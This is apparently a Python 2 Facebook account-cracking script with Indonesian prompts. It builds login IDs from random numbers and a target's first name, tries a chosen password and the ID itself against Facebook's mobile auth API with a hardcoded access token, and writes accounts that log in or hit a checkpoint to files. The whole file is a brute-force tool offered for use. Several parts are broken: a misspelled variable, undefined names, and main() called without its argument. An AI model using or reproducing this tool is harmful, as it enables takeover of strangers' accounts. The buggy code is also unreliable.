#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(2000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 upil.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


def keluar():
	print 'Selamat Tinggal '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


def num():
	for s in range(1):
		angk = random.randint(111, 999)
		sys.stdout = open('.txt', 'a')
		print(angk)
		sys.stdout.flush()


back = 0
berhasil = []
cekpoint = []
oks = []
cp = []
id = []
cpb = []
threads = []
sucessful = []
checkpoint = []
cp = []
ok = []


os.system('clear')
print logo
print
print 42*"\033[1;96m="
print("\033[1;96m[+] \033[1;93mNama Depan FB Target \033[1;97m: ")
print 42*"\033[1;96m="
try:
	firtname = raw_input("\033[1;96m[?] \033[1;93mMasukan Nama  \033[1;97m: ")
	idlist = ('.txt')
	for line in open(idlist,"r").readlines():
		id.append(line.strip())
except IOError:
	print ("[!] File Not Found")
	raw_input("\n[ Keluar ]")
	keluar()


			
xxx = str(len(id))
print ('\033[1;96m[✓] \033[1;93mTotal Nama: \033[97m'+xxx)
time.sleep(0.1)
pass1 = raw_input("\033[1;96m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
print 42*"\033[1;96m="
print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
print 42*"\033[1;96m="
	
			
def main(arg):
	global cpb,oks
	user = arg
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		pass1
		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
		q = json.load(data)
		if 'access_token' in q:
			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
			okb = open('save/successfull.txt', 'a')
			okb.write(firstname+user+'|'+pass1+'\n')
			okb.close()
			oks.append(firstname+user+pass1)
		else:
			if 'www.facebook.com' in q['error_msg']:
				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
				cps = open('save/checkpoint.txt', 'a')
				cps.write(firstname+user+'|'+pass1+'\n')
				cps.close()
				cpb.append(firstname+user+pass1)
			else:
				pass2 = user
				data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
				q = json.load(data)
				if 'access_token' in q:
					print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
					okb = open('save/successfull.txt', 'a')
					okb.write(firstname+user+'|'+pass2+'\n')
					okb.close()
					oks.append(firstname+user+pass2)
				else:
					if 'www.facebook.com' in q['error_msg']:
						print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
						cps = open('save/checkpoint.txt', 'a')
						cps.write(firstname+user+'|'+pass2+'\n')
						cps.close()
						cpb.append(firstname+user+pass2)


		
#welcome 
def welcome():
	wel = """+=========================================+
|..........   Facebook Crack   ...........|
+-----------------------------------------+
|            #Author: UPIL FACEBOOK              | 
|	       Version 1.0                |
|   https://github.com/aryhas             |
+=========================================+
|..........  Facebook Cracker  ...........|
+-----------------------------------------+\n\n
"""
	print wel 
	print " [*] Account to crack : {}".format(firstname)
	print " [*] OK/CP :" , len(oks)/len(cpb)
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
